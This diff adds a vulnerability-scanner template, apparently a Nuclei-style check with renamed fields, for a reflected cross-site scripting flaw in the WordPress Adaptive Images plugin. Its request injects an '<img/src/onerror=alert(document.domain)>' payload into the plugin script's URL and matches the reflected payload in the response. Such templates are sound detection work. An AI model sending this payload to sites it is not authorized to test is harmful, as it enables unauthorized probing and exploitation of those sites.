@@ -1,0 +1,33 @@
+id: wp-adaptive-xss
+brief:
+    title: WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
+    by: dhiyaneshDK
+    level: high
+    about: WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.
+    label:
+        - wpscan
+        - wordpress
+        - xss
+        - wp-plugin
+        - wp
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true'
+      signs:
+        - "on": word
+          has:
+            - <img/src/onerror=alert(document.domain)>
+            - <td>Image</td>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
